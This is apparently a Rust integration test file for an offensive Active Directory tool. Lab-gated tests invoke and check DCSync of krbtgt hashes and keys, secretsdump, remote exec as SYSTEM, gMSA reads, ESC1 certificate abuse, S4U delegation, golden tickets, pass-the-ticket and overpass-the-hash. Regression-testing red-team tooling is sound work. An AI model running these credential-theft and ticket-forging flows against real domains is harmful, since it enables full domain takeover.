//! Live integration tests against a real DC — the regression net for the offensive flows that
//! unit tests can't cover. All are `#[ignore]`d so the normal `cargo test` stays hermetic; run
//! them explicitly against a lab:
//!
//!   ADH_DC=10.0.0.1 ADH_DOMAIN=CORP ADH_REALM=CORP.LOCAL \
//!   ADH_USER=Administrator ADH_PASS='...' cargo test -p adhammer --test integration -- --ignored
//!
//! Each asserts a known-good outcome (e.g. krbtgt hash is 32 hex, exec returns SYSTEM), so a
//! regression in DCSync/exec/SAMR/secretsdump/ESC1 fails the run instead of silently shipping.

use std::process::Command;

fn env(k: &str) -> Option<String> {
    std::env::var(k).ok().filter(|v| !v.is_empty())
}

/// Run the built `adhammer` binary with args; return combined stdout+stderr. Returns None when
/// the lab env isn't configured (so the test is skipped rather than failing).
fn run(args: &[&str]) -> Option<String> {
    env("ADH_DC")?; // gate: no lab configured
    let bin = env!("CARGO_BIN_EXE_adhammer");
    // A spawn failure (e.g. a sandboxed/locked-down host) skips rather than false-fails.
    let out = Command::new(bin).args(args).output().ok()?;
    Some(format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    ))
}

fn dc() -> String {
    env("ADH_DC").unwrap()
}
fn domain() -> String {
    env("ADH_DOMAIN").unwrap_or_else(|| "CORP".into())
}
fn user() -> String {
    env("ADH_USER").unwrap_or_else(|| "Administrator".into())
}
fn pass() -> String {
    env("ADH_PASS").unwrap_or_default()
}

#[test]
#[ignore = "live DC"]
fn dcsync_krbtgt_returns_nt_hash() {
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--target",
        "krbtgt",
    ]) else {
        return;
    };
    let line = o
        .lines()
        .find(|l| l.starts_with("krbtgt:"))
        .expect("krbtgt line");
    let nt = line.split(':').nth(3).unwrap_or("");
    assert_eq!(nt.len(), 32, "krbtgt NT hash must be 32 hex: {line}");
    assert!(nt.chars().all(|c| c.is_ascii_hexdigit()));
    // Kerberos-key extraction: the krbtgt AES256 key (golden-ticket key) must be present,
    // 64 hex chars, on its own `krbtgt:aes256-cts-hmac-sha1-96:<key>` line.
    let aes = o
        .lines()
        .find(|l| l.starts_with("krbtgt:aes256-cts-hmac-sha1-96:"))
        .and_then(|l| l.rsplit(':').next())
        .expect("krbtgt aes256 key line");
    assert_eq!(aes.len(), 64, "krbtgt AES256 key must be 64 hex: {aes}");
    assert!(aes.chars().all(|c| c.is_ascii_hexdigit()));
}

#[test]
#[ignore = "live DC"]
fn samr_enumerates_users() {
    let Some(o) = run(&[
        "enum",
        "samr",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
    ]) else {
        return;
    };
    assert!(o.contains("SAMR users"), "expected SAMR user listing:\n{o}");
    assert!(o.contains("Administrator"));
}

#[test]
#[ignore = "live DC"]
fn exec_runs_as_system() {
    let Some(o) = run(&[
        "attack",
        "exec",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "exec should run as SYSTEM:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn secretsdump_dumps_machine_and_sam() {
    let Some(o) = run(&[
        "attack",
        "secretsdump",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
    ]) else {
        return;
    };
    assert!(
        o.contains("Administrator:500:"),
        "SAM Administrator line:\n{o}"
    );
    assert!(o.contains("$MACHINE.ACC:"), "LSA $MACHINE.ACC line:\n{o}");
}

#[test]
#[ignore = "live DC"]
fn gmsa_read_returns_nt_hash() {
    let url = format!("ldaps://{}:636", dc());
    let target = env("ADH_GMSA").unwrap_or_else(|| "gmsa_web$".into());
    // LDAPS simple bind needs a qualified name (DOMAIN\user), unlike the NTLM commands.
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "attack",
        "gmsa",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
        "--target",
        &target,
    ]) else {
        return;
    };
    // gmsa_web$:aad3b435...:<nt>:::  — assert a 32-hex NT hash came back.
    // gMSA line is `sam:LM:NT:::` (no RID field, unlike dcsync) → NT hash at index 2.
    let line = o.lines().find(|l| l.contains(&target)).expect("gmsa line");
    let nt = line.split(':').nth(2).unwrap_or("");
    assert_eq!(nt.len(), 32, "gMSA NT hash must be 32 hex: {line}");
}

#[test]
#[ignore = "live DC"]
fn esc1_enrolls_certificate() {
    let ca = env("ADH_CA").unwrap_or_else(|| "corp-CA".into());
    let template = env("ADH_TEMPLATE").unwrap_or_else(|| "User".into());
    let out = std::env::temp_dir().join("adh_it.crt");
    let Some(o) = run(&[
        "attack",
        "esc1",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--ca",
        &ca,
        "--template",
        &template,
        "--upn",
        &format!("{}@corp.local", user()),
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(
        o.contains("certificate ISSUED"),
        "CA should issue a cert:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn constrained_delegation_s4u() {
    // Requires a lab account with msDS-AllowedToDelegateTo + protocol transition.
    let (acct, pw, spn) = match (
        env("ADH_DELEG_ACCT"),
        env("ADH_DELEG_PASS"),
        env("ADH_DELEG_SPN"),
    ) {
        (Some(a), Some(p), Some(s)) => (a, p, s),
        _ => return, // not configured
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let Some(o) = run(&[
        "attack",
        "constrained",
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--account",
        &acct,
        "--account-password",
        &pw,
        "--impersonate",
        "Administrator",
        "--target-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("service ticket") || o.contains("succeeded"),
        "S4U chain should yield a ticket:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn dcsync_all_dumps_domain() {
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--all",
    ]) else {
        return;
    };
    assert!(o.contains("krbtgt:502:"));
    assert!(o.contains("Administrator:500:"));
    assert!(o.contains("full-domain DCSync complete"));
}

#[test]
#[ignore = "live DC"]
fn golden_ticket_accepted() {
    // Extra gate: needs the krbtgt AES256 key + domain SID (from a prior dcsync).
    let (Some(key), Some(sid)) = (env("ADH_KRBTGT_AES256"), env("ADH_DOMAIN_SID")) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let spn = format!("cifs/dc01.{}", realm.to_lowercase());
    let Some(o) = run(&[
        "attack",
        "golden",
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--krbtgt-aes256",
        &key,
        "--domain-sid",
        &sid,
        "--verify-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("KDC accepted the golden ticket"),
        "golden ticket not accepted: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn pass_the_ticket_golden_exec() {
    let (Some(key), Some(sid), Some(spn)) = (
        env("ADH_KRBTGT_AES256"),
        env("ADH_DOMAIN_SID"),
        env("ADH_SPN"),
    ) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let Some(o) = run(&[
        "attack",
        "pth",
        "--host",
        &dc(),
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--domain-sid",
        &sid,
        "--krbtgt-aes256",
        &key,
        "--spn",
        &spn,
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.contains("Kerberos SMB session established"),
        "no PtT session: {o}"
    );
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "golden PtT did not run as SYSTEM: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn overpass_the_hash_gets_tgt() {
    // RC4-HMAC overpass-the-hash: NT hash → TGT. Needs ADH_OPTH_USER + ADH_OPTH_HASH (32 hex).
    let (Some(user), Some(hash)) = (env("ADH_OPTH_USER"), env("ADH_OPTH_HASH")) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let out = std::env::temp_dir().join("adh_optt.ccache");
    let Some(o) = run(&[
        "attack",
        "asktgt",
        "--user",
        &user,
        "--realm",
        &realm,
        "--kdc",
        &dc(),
        "--nt-hash",
        &hash,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(o.contains("TGT obtained"), "overpass-the-hash failed:\n{o}");
}
